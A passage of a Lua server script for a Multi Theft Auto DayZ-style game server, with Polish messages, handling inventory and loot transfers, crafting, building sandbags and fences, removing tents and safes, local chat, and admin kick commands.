				setElementData(i,"Podniesiony-Pause",false)
				podniesienii[i] = nil
			end
		end
	end
end,60000,0)



addEventHandler("onPlayerGiveMedicObject", root, function(itemName, player)
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	if getElementData(player,"Nearly-Dead") then
		setElementData(player,"Nearly-Dead",false)
		triggerClientEvent(player,"ShowMeDeadRender",player,false)
		setPedAnimation(player)
		setElementData(player,"Podniesiony-Pause",true)
		podniesienii[player] = getTickCount() + 60000 * 5
	end
	setTimer(function(source)
		if (itemName == "givebandage") then
			setElementData(player, "bleeding", 0);
			setElementData(source, "Bandage", getElementData(source, "Bandage") - 1);
			addPlayerStats(source, "humanity", 40);
		elseif (itemName == "giveblood") then
			addPlayerStats(player, "blood", 12000);
			setElementData(source, "Blood Bag", getElementData(source, "Blood Bag") - 1);
			addPlayerStats(source, "humanity", 250);
		end
		triggerClientEvent(source, "refreshInventoryManual", source);
	end, 1000, 1, source);
end);

function getSkinIDFromName(name)
	for _,v in ipairs(skinTable) do
		if (name == v[1]) then return v[2]; end
	end
end

function getSkinNameFromID(id)
	for _,v in ipairs(skinTable) do
		if (id == v[2]) then return v[1]; end
	end
	return 'brak'
end


local typy_skinow = {
	[287] = true,
	[288] = true,
	[285] = true,
	[73] = true,
	[76] = true,
	[235]=true,
	[75] = true,
	[77] = true,
	[78] = true,
	[235]=true,
}

function getSkinType(player,id)
	if typy_skinow[id] then
		return true
	end
	return false
end


addEventHandler("onPlayerChangeSkin", root, function(skin)
	local name = getSkinNameFromID(getElementData(source, "skin"));
	local id = getSkinIDFromName(skin);
	if getSkinType(id) then
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Nie możesz ubrać tego skina!",source,255,255,255,true)
		return
	end
	setElementData(source, name, (getElementData(source, name) or 0)+1);
	setElementData(source, skin, (getElementData(source, skin) or 0)-1);
	
	setElementData(source, "skin", id);
	setElementModel(source, id);
	triggerClientEvent(source, "refreshInventoryManual", source);
end);

addEventHandler("onPlayerRefillWaterBottle", root, function(itemName)
	if isElementInWater(source) then
if getElementData(source,itemName)<=0 then return end
		setElementData(source, "Water Bottle", getElementData(source, "Water Bottle") + 1);
		setElementData(source, itemName, getElementData(source, itemName) - 1);
		exports.DayZ_notification:DrawNotification("Napełniłeś 1 x "..itemName, 255, 255, 255, source);
		triggerClientEvent(source, "refreshInventoryManual", source);
	else
		exports.DayZ_notification:DrawNotification("Musisz być w wodzie aby napełnić butelke!!", 255, 255, 255, source);
	end 
end);

addEventHandler("onPlayerBuildAWireFence", root, function(itemName)
if getElementData(source,itemName)<=0 then return end
	setElementData(source, itemName, getElementData(source, itemName)-1);
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	triggerClientEvent(source, "refreshInventoryManual", source);
	setTimer(function(source)
		local x,y,z = getElementPosition(source);
		local xr,yr,zr = getElementRotation(source);
		local offsetRot = math.rad(zr+90);
		local vx = x+1*math.cos(offsetRot);
		local vy = y+1*math.sin(offsetRot);
		local vrot = zr+90;
		local wFence = createObject(983, vx, vy, z, xr, yr, vrot);
		setObjectScale(wFence, 1);
		local wFenceCol = createColSphere(x, y, z, 2);
		attachElements(wFenceCol, wFence, 0, 0, 0);
		setElementData(wFenceCol, "parent", wFence);
		setElementData(wFence, "parent", wFenceCol);
		setElementData(wFenceCol, "wirefence", true);
		exports["frag_system_logs"]:saveLogServer("[WIREFENCEE] Pozycja: "..x.." "..y.." "..z.."| POSTAWIŁ: "..getPlayerName(source).." (login:"..getElementData(source, "logedin")..") | Serial:"..getPlayerSerial(source).."","sandbags", "sandbagi" )
	end, 2000, 1, source);
end);

addEventHandler("removeWirefence", root, function(object)
	setTimer(function(object)
		destroyElement(getElementData(object, "parent"));
		destroyElement(object);
	end, 2000, 1, object);
end);




addEvent('removeSandbag',true)
addEventHandler('removeSandbag',root,function(object,item)
	if isElement(object) then
		local col = getElementData(object, "parent");
		deleteFromXML(getElementData(object,"Sandbag:ID"))
		setTimer(function(col, object,player,item)
			if isElement(object) then
				local pos = {getElementPosition(player)}
				local item,itemString = exports['DayZ']:getItemTablePosition(item);
				local itemPickup = exports['DayZ']:createItemPickup(item, pos[1], pos[2], (pos[3]), itemString);
				if col then destroyElement(col); end
				if object then destroyElement(object); end
			end
		end, 2000, 1, col, object,source,item);
	end
end)

addEvent('removeBush',true)
addEventHandler('removeBush',root,function(object,item)
local col = getElementData(object, "parent");
	setTimer(function(col, object,player,item)
		local pos = {getElementPosition(player)}
		local item,itemString = exports['DayZ']:getItemTablePosition(item);
		local itemPickup = exports['DayZ']:createItemPickup(item, pos[1], pos[2], (pos[3]), itemString);
		if col then destroyElement(col); end
		if object then destroyElement(object); end
	end, 2000, 1, col, object,source,item);
end)

addEvent('onPlayerBuildASandbag',true)
addEventHandler("onPlayerBuildASandbag", root, function(itemName)
if getElementData(source,itemName)<=0 then return end
	setElementData(source, itemName, getElementData(source, itemName)-1);
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	triggerClientEvent(source, "refreshInventoryManual", source);
	setTimer(function(source)
		local x,y,z = getElementPosition(source);
		local xr,yr,zr = getElementRotation(source);
		local offsetRot = math.rad(zr+90);
		local vx = x+1*math.cos(offsetRot);
		local vy = y+1*math.sin(offsetRot);
		local vrot = zr+90;
		local wFence = createObject(14843, vx, vy, z-0.2, xr, yr, vrot);
		local id = xmlGetLastID()
		local dane = {
			["id"] = id,
			["pozycja"] = toJSON({vx,vy,z-0.2}),
			["rotacja"] = toJSON({xr,yr,vrot}),
		}
		setElementData(wFence,"Sandbag:ID",id)
		xmlAddLastID()
		addToXML(dane)
		setObjectScale(wFence, 1);
		local wFenceCol = createColSphere(x, y, z, 1.5);
		attachElements(wFenceCol, wFence, 0, 0, 0);
		setElementData(wFenceCol, "parent", wFence);
		setElementData(wFence, "parent", wFenceCol);
		setElementData(wFenceCol, "sandbag", true);
		exports["frag_system_logs"]:saveLogServer("[SANDBAG] Pozycja: "..x.." "..y.." "..z.." | POSTAWIŁ: "..getPlayerName(source).." (login:"..getElementData(source, "logedin")..") | Serial:"..getPlayerSerial(source).."","sandbags", "sandbagi" )
	end, 2000, 1, source);
end);

addEvent('onPlayerPutaBush',true)
addEventHandler("onPlayerPutaBush", root, function(itemName)
if getElementData(source,itemName)<=0 then return end
	setElementData(source, itemName, getElementData(source, itemName)-1);
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	triggerClientEvent(source, "refreshInventoryManual", source);
	setTimer(function(source)
		local x,y,z = getElementPosition(source);
		local xr,yr,zr = getElementRotation(source);
		local offsetRot = math.rad(zr+90);
		local vx = x+1*math.cos(offsetRot);
		local vy = y+1*math.sin(offsetRot);
		local vrot = zr+90;
		local wFence = createObject(647, vx, vy, z-0.2, xr, yr, vrot);
		setObjectScale(wFence, 1);
		local wFenceCol = createColSphere(x, y, z, 1.5);
		attachElements(wFenceCol, wFence, 0, 0, 0);
		setElementData(wFenceCol, "parent", wFence);
		setElementData(wFence, "parent", wFenceCol);
		setElementData(wFenceCol, "bush", true);
		exports["frag_system_logs"]:saveLogServer("[BUSH] Pozycja: "..x.." "..y.." "..z.." | POSTAWIŁ: "..getPlayerName(source).." (login:"..getElementData(source, "logedin")..") | Serial:"..getPlayerSerial(source).."","sandbags", "sandbagi" )
	end, 2000, 1, source);
end);

local new_table_items_in_loot = {}

function getElementMaxSlots(element)
	return (getElementData(element,"MAX_Slots") or 0)
end

function ButLutowisko(itemName,loot)
	if isPedDead(client) then return end
	if not loot or not client or not itemName then return end
	--[[if not new_table_items_in_loot[loot] then
	new_table_items_in_loot[loot] = {1,setTimer(function()
	new_table_items_in_loot[loot][1] = 0
	new_table_items_in_loot[loot] = nil
	end,1,1),getPlayerName(gracz):gsub("#%x%x%x%x%x%x","")}
	elseif new_table_items_in_loot[loot][1] then
	new_table_items_in_loot[loot][1] = 1 + new_table_items_in_loot[loot][1] -- 22, 255, 0 <-- zielony, ladny kolor
	end
	if new_table_items_in_loot[loot][1]>=2 then
	if new_table_items_in_loot[loot][3]~=getPlayerName(gracz) then
	exports.DayZ_notification:DrawNotification("Aktualnie #FFFFFF"..new_table_items_in_loot[loot][3].."#FF0000 zmienia loot, spróbuj ponownie za 0.1s ", 255, 0, 0, source);
	end
	return
	end]]
	--if not isElementWithinColShape(gracz,loot) then return end

	if (getElementData(loot, itemName) or 0) >= 1 then
	--triggerClientEvent(gracz,'onPlayerMoveItemInInventory',gracz,itemName,loot,getElementData(loot,itemName))
		local itemPlus = 1*1;
		if (itemName == "M1911 Mag") then itemPlus = 10*1;
		elseif (itemName == "M9 SD Mag") then itemPlus = 15*1;
		elseif (itemName == "Desert Eagle Mag") then itemPlus = 7;
		elseif (itemName == "PDW Mag") then itemPlus = 30;
		elseif (itemName == "MP5A5 Mag") then itemPlus = 20;
		elseif (itemName == "AS50 Mag") then itemPlus = 10;
		elseif (itemName == "AWP Mag") then itemPlus = 5;
		elseif (itemName == "AA-12 Mag") then itemPlus = 20;
		elseif (itemName == "Barrett M107 Mag") then itemPlus = 1;
		elseif (itemName == "SVD Dragunov Mag") then itemPlus = 10;
		elseif (itemName == "Mosin 9130 Mag") then itemPlus = 35;
		elseif (itemName == "M24 Mag") then itemPlus = 10;
		elseif (itemName == "Cheytac M200 Mag") then itemPlus = 5
		elseif (itemName == "M107 Mag") then itemPlus = 5
		elseif (itemName == "SVD Dragunov Camo Mag") then itemPlus = 25;
		elseif (itemName == "MK 48 Mod 0 Mag") then itemPlus = 100;
		elseif (itemName == "M60 Mag") then itemPlus = 100;
		elseif (itemName == "PKP Pecheneg Mag") then itemPlus = 100;
		elseif (itemName == "MG-34 Mag") then itemPlus = 100;
		elseif (itemName == "AK-47 Mag") then itemPlus = 30;
		elseif (itemName == "Scar-L Mag") then itemPlus = 30;
		elseif (itemName == "M16A4 Mag") then itemPlus = 30;
		elseif (itemName == "SA-58V ACOG Mag") then itemPlus = 30;
		elseif (itemName == "AKS-74U Mag") then itemPlus = 30;
		elseif (itemName == "M4A1-S Mag") then itemPlus = 30;
		elseif (itemName == "G36C Mag") then itemPlus = 30;
		elseif (itemName == "1866 Slug") then itemPlus = 7;
		elseif (itemName == "2Rnd. Slug") then itemPlus = 2;
		elseif (itemName == "SPAZ-12 Pellet") then itemPlus = 7;
		elseif (itemName == "DMR Mag") then itemPlus = 5;
		elseif (itemName == "Lee Enfield Mag") then itemPlus = 10;
		end
		if getElementCurrentSlots(client)+(getItemSlots(itemName) * itemPlus) > (getElementMaxSlots(client)) + (getElementData(client,"Custom_Slots") or 0) then
			triggerClientEvent("displayClientInfo", client, "Posiadasz za mało miejsca w ekwipunku", 255, 0, 0);
			return
		end
		if itemName == "Flara" then
			local n = getElementData(client, "Flara \n")
			if n > 0 then 
				local l_n = getElementData(loot, "Flara") or 0
				setElementData(loot, "Flara", l_n-1)
				setElementData(client, "Flara \n", n+1)
				setWeaponAmmo(client, 17, n+1);
			else
				local l_n = getElementData(loot, "Flara") or 0
				n = getElementData(client, "Flara")
				setElementData(loot, "Flara", l_n-1)
				setElementData(client, "Flara", n+1)
			end
		else
			setElementData(loot, itemName, (getElementData(loot, itemName) or 0) - 1);
			setElementData(client, itemName, (getElementData(client, itemName) or 0) + (itemPlus));
		end
		if getElementData(client,"isLootingPrivTent") then
			triggerClientEvent(client,'refreshLootManual',client,loot)
			triggerEvent("PrivTentsreloadValues",client,loot)
		elseif #getElementsWithinColShape(loot, "player") >= 1 then 
			triggerEvent("onPlayerChangeLoot", root, loot);
		end
		triggerClientEvent(client, "refreshInventoryManual", client);
		if getElementData(loot, "itemloot") then
			triggerEvent("refreshItemLoot", root, loot, "other");
		end
	end

	--	for i,v in pairs(getElementsWithinColShape(loot,'player')) do
	--	if gracz~=v then
	--triggerClientEvent(v,'refreshLootManual',v,loot)
	--triggerClientEvent(v, "refreshInventoryManual", v);
	--end
	--end
end
addEvent('MoveToEq',true)
addEventHandler('MoveToEq',root,ButLutowisko)


addEvent('Wycraftowano_tralalala',true)
addEventHandler('Wycraftowano_tralalala',root,function(player,data)
	if isPedDead(client) then return end
	local chuje = {}
	if not data.potrzebne then return end
	for i,v in pairs(data.potrzebne) do
		if not chuje[v] then
			chuje[v] = 1
		else
			chuje[v] = chuje[v] + 1
		end
	end
	for i,v in pairs(chuje) do
		if (getElementData(player,i) or 0)<v then
			outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Nie posiadasz wystarczająco materiałów!",player,255,255,255,true)
			return
		end
	end
	if data.wymagane and (getElementData(player,data.wymagane) or 0) <1 then
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Nie posiadasz wymaganego materiału!",player,255,255,255,true)
		return
	end
	local custom_slots = getElementData(player,"Custom_Slots") or 0
	if getElementCurrentSlots(player) + getItemSlots(data.wytworzy)*data.ilosc_otrzymana > getElementData(player,"MAX_Slots") + custom_slots then
		outputChatBox("#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Posiadasz za mało slotów aby wycraftować ten przedmiot!",player,255,255,255,true)
		return
	end
	for i,v in pairs(chuje) do
		setElementData(player,i,(getElementData(player,i) or 0)-v)
	end
	setElementData(player,data.wytworzy,(getElementData(player,data.wytworzy) or 0)+data.ilosc_otrzymana)
	outputChatBox("* Zcraftowano pomyślnie! Otrzymujesz: "..data.wytworzy.." x"..data.ilosc_otrzymana,player,0,255,0)
	triggerClientEvent(player, "refreshInventoryManual", player);
	--triggerClientEvent(player, "refreshLootManual", player,loot);
end)

local loots_table = {
}


addEvent('Trigg_To_Trigg',true)
addEventHandler('Trigg_To_Trigg',root,function(itemName,loot)
	if isPedDead(source) then return end
	if getElementData(source,itemName)<=0 then return end
--[[
if loot then
	if not loots_table[loot] then
		loots_table[loot] = {1,setTimer(function()
			loots_table[loot][1] = 0
			loots_table[loot] = nil
		end,1,1),getPlayerName(source):gsub("#%x%x%x%x%x%x","")}
	elseif loots_table[loot][1] then
		loots_table[loot][1] = 1+loots_table[loot][1]
	else
		
	end
	if loots_table[loot][1]>=2 then
		if loots_table[loot][3]~=getPlayerName(source) then
			exports.DayZ_notification:DrawNotification("Aktualnie #FFFFFF"..loots_table[loot][3].."#FF0000 zmienia loot, spróbuj ponownie za 0.1s ", 255, 0, 0, source);
		end
		return
	end	
end]]
--[[
if itemName=="Parts_inVehicle" then
if getElementData(source,'Tank Parts')<=0 then return end
end
if itemName=='Tire' and arg==2 and liczba==1 then
	triggerClientEvent(source,'onPlayerMoveItemOutOFInventory',source,itemName.."_inVehicle",loot,liczba,tonumber(getRealNumber),btn)
elseif itemName=='Engine' and arg==2 and liczba==1 then
	triggerClientEvent(source,'onPlayerMoveItemOutOFInventory',source,itemName.."_inVehicle",loot,liczba,tonumber(getRealNumber),btn)
elseif itemName=='Tank Parts' and arg==2 and liczba==1 then
	triggerClientEvent(source,'onPlayerMoveItemOutOFInventory',source,'Parts_inVehicle',loot,liczba,tonumber(getRealNumber),btn)
else
	triggerClientEvent(source,'onPlayerMoveItemOutOFInventory',source,itemName,loot,liczba,tonumber(getRealNumber),btn)
end]]
	local itemPlus = 1*1;
	local numberR
	if (itemName == "M1911 Mag") then itemPlus = 10*1;
	elseif (itemName == "M9 SD Mag") then itemPlus = 15*1;
	elseif (itemName == "Desert Eagle Mag") then itemPlus = 7*1;
	elseif (itemName == "PDW Mag") then itemPlus = 30*1;
	elseif (itemName == "MP5A5 Mag") then itemPlus = 20*1;
	elseif (itemName == "AS50 Mag") then itemPlus = 10*1;
	elseif (itemName == "AWP Mag") then itemPlus = 5*1;
	elseif (itemName == "AA-12 Mag") then itemPlus = 20*1;
	elseif (itemName == "Barrett M107 Mag") then itemPlus = 1*1;
	elseif (itemName == "SVD Dragunov Mag") then itemPlus = 10*1;
	elseif (itemName == "Mosin 9130 Mag") then itemPlus = 35*1;
	elseif (itemName == "M24 Mag") then itemPlus = 10*1;
	elseif (itemName == "Cheytac M200 Mag") then itemPlus = 5*1;
	elseif (itemName == "M107 Mag") then itemPlus = 5*1;
	elseif (itemName == "SVD Dragunov Camo Mag") then itemPlus = 25*1;
	elseif (itemName == "MK 48 Mod 0 Mag") then itemPlus = 100*1;
	elseif (itemName == "M60 Mag") then itemPlus = 100*1;
	elseif (itemName == "PKP Pecheneg Mag") then itemPlus = 100*1;
	elseif (itemName == "MG-34 Mag") then itemPlus = 100*1;
	elseif (itemName == "AK-47 Mag") then itemPlus = 30*1;
	elseif (itemName == "Scar-L Mag") then itemPlus = 30*1;
	elseif (itemName == "M16A4 Mag") then itemPlus = 30*1;
	elseif (itemName == "SA-58V ACOG Mag") then itemPlus = 30*1;
	elseif (itemName == "AKS-74U Mag") then itemPlus = 30*1;
	elseif (itemName == "M4A1-S Mag") then itemPlus = 30*1;
	elseif (itemName == "G36C Mag") then itemPlus = 30*1;
	elseif (itemName == "1866 Slug") then itemPlus = 7*1;
	elseif (itemName == "2Rnd. Slug") then itemPlus = 2*1;
	elseif (itemName == "SPAZ-12 Pellet") then itemPlus = 7*1;
	elseif (itemName == "DMR Mag") then itemPlus = 5*1;
	elseif (itemName == "Lee Enfield Mag") then itemPlus = 10*1;
	elseif string.find(itemName, "\n") and not itemName:find('Kamizelka') then
		if (itemName == "Flara \n") and (getElementData(source, itemName) == 1) then
			triggerEvent("removeBackWeaponOnDrop", source, true, getEquippedWeaponSlot(itemName));
		elseif (itemName == "Flara \n") then
			local ammo = getElementData(source, itemName)
			setWeaponAmmo(source, 17, ammo-1);
		else
			triggerEvent("removeBackWeaponOnDrop", source, true, getEquippedWeaponSlot(itemName));
		end
	end
	if loot then
		if string.find(itemName, "\n") then
			local iname = getEquippedWeaponName(itemName);
			setElementData(loot, iname, (getElementData(loot, iname) or 0) + 1);
			setElementData(source, itemName, getElementData(source, itemName) - itemPlus);
		else
			if getElementData(source,itemName)>=itemPlus then
				setElementData(loot, itemName, (getElementData(loot, itemName) or 0) + 1);
				setElementData(source, itemName, getElementData(source, itemName) - (itemPlus));
			else
				setElementData(source,itemName,0)
				--setElementData(loot, itemName2, (getElementData(loot, itemName2) or 0) + getElementData(localPlayer,itemName2));
				--setElementData(localPlayer, itemName2, getElementData(localPlayer, itemName2) - getElementData(localPlayer,itemName2));
			end
		end
		if (#getElementsWithinColShape(loot, "player") >= 1) then
			triggerEvent("onPlayerChangeLoot", root, loot);
		end
		if getElementData(source,"isLootingPrivTent") then
			triggerEvent("PrivTentsreloadValues",source,loot)
		end
	else
	if getElementData(source,itemName)<=itemPlus then
		numberR = getElementData(source,itemName)
		setElementData(source, itemName, getElementData(source, itemName) - getElementData(source,itemName));
	else
		numberR = itemPlus
		setElementData(source, itemName, getElementData(source, itemName) - itemPlus);
	end
	if string.find(itemName, "\n") then
		triggerEvent("playerDropAItem", source, getEquippedWeaponName(itemName),numberR);
	else
		triggerEvent("playerDropAItem", source, itemName,numberR);
	end
	if itemName == "Flara" then
		local weapon = getPedWeapon(source)
		local clip = getPedAmmoInClip(source)
		setWeaponClipAmmo(weapon, clip-1)
	end
end
	--refreshLoot()
	if getElementData(source,"current_helm") and getElementData(source,"current_helm")[1] == itemName then
		if getElementData(source,itemName) == 0 then
			setElementData(source,"current_helm",nil)
		end
	end
	if getElementData(source,"current_kamizelka") and getElementData(source,"current_kamizelka")[1] == itemName then
		if getElementData(source,itemName) == 0 then
			setElementData(source,"current_kamizelka",nil)
		end
	end
	if getElementData(source,"current_tlumik") and getElementData(source,"current_tlumik") == itemName then
		if getElementData(source,itemName) == 0 then
			setElementData(source,"current_tlumik",nil)
		end
	end
	if getElementData(source,"isLootingPrivTent") then
		triggerClientEvent(source, "refreshInventoryManual", source);
		triggerClientEvent(source, "refreshLootManual", source,loot);
	elseif loot then
		if getElementData(loot,"itemloot") then
			triggerEvent("refreshItemLoot", root, loot, "other");
		end
		for i,v in pairs(getElementsWithinColShape(loot,'player')) do
			triggerClientEvent(v, "refreshInventoryManual", v);
			triggerClientEvent(v, "refreshLootManual", v,loot);
		end
	else
		triggerClientEvent(source, "refreshInventoryManual", source);
	end
end)

local tickers = {}

addEventHandler("removeTent",root, function(object,item)
	if not getElementData(object, "parent") or not object then return end
	local col = getElementData(object, "parent");
	local jezyk = getElementData(source,'Jezyk_Gry') or "PL"
	if (tickers[source] or 0)>getTickCount() then
		if jezyk=="PL" then
			outputChatBox("* Musisz odczekać chwile!",source,255,255,255)
		else
			outputChatBox("* You need to wait a moment!",source,255,255,255)
		end
		return
	end
	local sloty = getElementCurrentSlots(col)
	
	if sloty > 2 then
		if jezyk=="PL" then
			tickers[source] = getTickCount() + 5000
			outputChatBox("* W namiocie znajdują się przedmioty!",source,255,255,255)
		else
			outputChatBox("* There are items in the tent!",source,255,255,255)
		end
		return
	end
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	triggerClientEvent(source,'SuccesfullTentRemove',source)
	setTimer(function(col, object,player,item)
		if not isElement(col) or not isElement(object) then return end
		local pos = {getElementPosition(player)}
		local item,itemString = exports['DayZ']:getItemTablePosition(item);
		local itemPickup = exports['DayZ']:createItemPickup(item, pos[1], pos[2], (pos[3]), itemString);
		if col then destroyElement(col); end
		if object then destroyElement(object); end
	end, 2000, 1, col, object,source,item);
end);

addEvent("removeKontener", true)
addEventHandler("removeKontener", root, function(object,item)
	if not getElementData(object, "parent") or not object then return end
	local col = getElementData(object, "parent");
	local jezyk = getElementData(source,'Jezyk_Gry') or "PL"
	if (tickers[source] or 0)>getTickCount() then
		if jezyk=="PL" then
			outputChatBox("* Musisz odczekać chwile!",source,255,255,255)
		else
			outputChatBox("* You need to wait a moment!",source,255,255,255)
		end
		return
	end
	local sloty = getElementCurrentSlots(col)
	if sloty > 2 then
		if jezyk=="PL" then
			tickers[source] = getTickCount() + 5000
			outputChatBox("* W kontenerze znajdują się przedmioty!",source,255,255,255)
		else
			outputChatBox("* There are items in the kontener!",source,255,255,255)
		end
		return
	end
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	triggerClientEvent(source,'SuccesfullTentRemove',source)
	setTimer(function(col, object,player,item)
		if not isElement(col) or not isElement(object) then return end
		local pos = {getElementPosition(player)}
		local item,itemString = exports['DayZ']:getItemTablePosition(item);
		local itemPickup = exports['DayZ']:createItemPickup(item, pos[1], pos[2], (pos[3]), itemString);
		if col then destroyElement(col); end
		if object then destroyElement(object); end
	end, 2000, 1, col, object,source,item);
end)

function zlozSejfa(col)
	if col then
		local object = getElementData(col,"parent")
		local jezyk = getElementData(source,'Jezyk_Gry') or "PL"
		if (tickers[source] or 0)>getTickCount() then
			if jezyk=="PL" then
				outputChatBox("* Musisz odczekać chwile!",source,255,255,255)
			else
				outputChatBox("* You need to wait a moment!",source,255,255,255)
			end
			return
		end
		local sloty = getElementCurrentSlots(col)
		if sloty > 2 then
			tickers[source] = getTickCount() + 5000
			if jezyk=="PL" then
				outputChatBox("* W sejfie znajdują się przedmioty!",source,255,255,255)
			else
				outputChatBox("* There are items in the safe!",source,255,255,255)
			end
			return
		end
		setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
		setTimer(function(col, object,player)
			local pos = {getElementPosition(player)}
			local item,itemString = exports['DayZ']:getItemTablePosition("Safe");
			local itemPickup = exports['DayZ']:createItemPickup(item, pos[1], pos[2], (pos[3]), itemString);
			if col then destroyElement(col); end
			if object then destroyElement(object); end
		end, 2000, 1, col, object,source);
	end
end
addEvent("zlozSejfa",true)
addEventHandler("zlozSejfa",root,zlozSejfa)

addEvent('removeArmybox',true)
addEventHandler("removeArmybox",root, function(object)
	local col = getElementData(object, "parent");
	setTimer(function(col, object)
		local x,y,z = getElementPosition(col);
		if col then destroyElement(col); end
		if object then destroyElement(object); end
	end, 2000, 1, col, object);
end);

addEventHandler("addPlayerCookMeat", root, function()
	setPedAnimation(source, "BOMBER", "BOM_Plant", -1, false, false, nil, false);
	local meat = getElementData(source, "Raw Meat");
	setTimer(function(source)
		if (getElementData(source,"Raw Meat") or 0) == 0 then return end
		setElementData(source, "Raw Meat", getElementData(source,"Raw Meat") - 1);
		setElementData(source, "Cooked Meat", getElementData(source, "Cooked Meat") + meat);
		exports.DayZ_notification:DrawNotification("Upiekłeś "..tostring(meat), 22, 255, 0, source);
	end, 5000, 1, source);
end);

addEventHandler("onPlayerMakeAFire", root, function(itemName)
if getElementData(source,itemName)<=0 then return end
	setElementData(source, "Wood Pile", getElementData(source, "Wood Pile")-1);
	local x,y,z = getElementPosition(source);
	local xr,yr,zr = getElementRotation(source);
	local offsetRot = math.rad(zr+90);
	local vx = x+1*math.cos(offsetRot);
	local vy = y+1*math.sin(offsetRot);
	local vrot = zr+90;
	local wood = createObject(1463, vx, vy, (z-0.75), xr, yr, vrot);
	setObjectScale(wood, 0.55);
	setElementCollisionsEnabled(wood, false);
	setElementFrozen(wood, true);
	local fire = createObject(3525, vx, vy, (z-0.75), xr, yr, vrot);
	setObjectScale(fire, 0);
	local fireCol = createColSphere(x, y, z, 2);
	setElementData(fireCol, "parent", wood);
	setElementData(wood, "parent", fireCol);
	setElementData(fireCol, "fireplace", true);
	triggerClientEvent(source, "refreshInventoryManual", source);
	setPedAnimation(source, "BOMBER","BOM_Plant", -1, false, false, nil, false);
	setTimer(function(fireCol, fire, wood)
		if fireCol then destroyElement(fireCol); end
		if fire then destroyElement(fire); end
		if wood then destroyElement(wood); end
	end, (2*60000), 1, fireCol, fire, wood);
end);

addEventHandler("onPlayerPlaceRoadflare", root, function(itemName)
if getElementData(localPlayer,itemName)<=0 then  return end
if getElementData(localPlayer,itemName)<=0 then  return end
	setElementData(source, itemName, getElementData(source, itemName)-1);
	local x,y,z = getElementPosition(source);
	local object = createObject(354, x, y, (z-0.6));
	setTimer(destroyElement, 300000, 1, object);
	triggerClientEvent(source, "refreshInventoryManual", source);
end);
 
addEventHandler("onPlayerChat", root, function(message, mType)
	
	if (mType == 0 or mType == 1) then
		cancelEvent();
	end
	if not getElementData(source,"logedin") then return end
	if (mType == 0) then
		local x,y,z = getElementPosition(source);
		local chatSphere = createColSphere(x, y, z, 35);
		local nearbyPlayers = getElementsWithinColShape(chatSphere, "player");
		destroyElement(chatSphere);
		for _,v in ipairs(nearbyPlayers) do
			outputChatBox("#D3D3D3[Local] #D3D3D3"..string.gsub((getPlayerName(source).." : #D3D3D3"..message), '#%x%x%x%x%x%x', ''), v, 211, 211, 211, true);
		end
	end 
end,true,"high+10");


--[[setTimer(function()
	for i,v in pairs(getElementsByType('player')) do
		if getElementData(v,'blood')<6000 and getElementData(v,'blood')>0 then
			local blood = math.random(100,200)
			setElementData(v,'blood',getElementData(v,'blood')+blood)
			triggerClientEvent(v, "displayClientInfo", v, "Przybyło Ci "..blood..' krwi!', 0, 200, 0);
		end
	end
end,12000,0)]]

addCommandHandler("kickall", function(player)
	if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(player)), aclGetGroup("Admin")) then
		for _,v in ipairs(getElementsByType("player")) do
			if (v ~= player) then
				kickPlayer(v, "#Hotfix!");
			end
		end
	end
end);

addEventHandler("onPlayerCommand", root, function(cmd)
	if (cmd == "login" or cmd == "logout" or cmd=='register') then
		cancelEvent();
	end
end);

addEventHandler("kickPlayerOnHighPing", resourceRoot, function(player)
if getElementData(player,'odswiezanie') then return end
if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(player)), aclGetGroup("Admin")) then
	return
end
if getPlayerSerial(player)=="TWOJ SERIAL :)" then return end
--if getElementData(root,"Restart-Lutow") then return end
	kickPlayer(player, "Ping > 300!");
end);

--[[local wait_timer = {}


function funcBindHandsup(player, key, keyState)
	if (handsUp) then
		setPedAnimation(player, false);
		handsUp = false;
	else
		if isPedInVehicle(player) then return false; end
		if not wait_timer[player] or wait_timer[player] < getTickCount() then
			wait_timer[player] = getTickCount() + 1000
		elseif wait_timer[player] > getTickCount() then
			return
		end
		setPedAnimation(player, "BEACH", "ParkSit_M_loop", -1, true, false, false, false);
		handsUp = true;
	end 
end

function funcBindSit(player, key, keyState)
	if (siting) then
		setPedAnimation(player, false);
		siting = false;
		setElementData(player,"Player:Anim",false)
	else
		if isPedInVehicle(player) then return false; end
		if not wait_timer[player] then
			wait_timer[player] = getTickCount() + 1000
		elseif wait_timer[player] > getTickCount() then
			return
		end
		setPedAnimation(player, "SHOP", "SHP_Rob_HandsUp", -1, true, true, false, false);
		siting = true
	end 
end
--]]


addEventHandler("relWep", resourceRoot, function(player)
	local reload = reloadPedWeapon(player);
end);

--[[addEventHandler("onPlayerLogin", root, function()
	bindKey(source, ",", "down", funcBindHandsup);
	bindKey(source, ".", "down", funcBindSit);
end);

for i,v in pairs(getElementsByType("player")) do
	bindKey(v, ",", "down", funcBindHandsup);
	bindKey(v, ".", "down", funcBindSit);
end]]--

addEventHandler("onPlayerHideBody", root, function()
	local cCol = getElementData(source, "currentCol");
	if (getElementData(source, "Bandage") >= 1) then
		if cCol then
			if getElementData(cCol, "deadman") then
				setElementData(source, "loot", false);
				setElementData(source, "Bandage", getElementData(source, "Bandage") - 1);
				setElementData(source, "currentCol", false);
				setTimer(function(cCol)
					if cCol then
						destroyElement(getElementData(cCol, "parent"));
					end
					destroyElement(cCol);
				end, 2000, 1, cCol);
			end 
		end
	end
end);

local player_timers = {}
local dziury = createElement("Dziury")
local dziury_col_delete = {}

local itemy_z_kopanie = {
	{0,10,"GPS",1},
	{11,20,'Map',1},
	{21,30,"Winchester 1866",1,"#FFFFFF["..exports.DayZ_Addons:getNazwaSerwera().."#FFFFFF] Wykopałeś Winchester 1866!"},
	{31,40,"AWP",1},
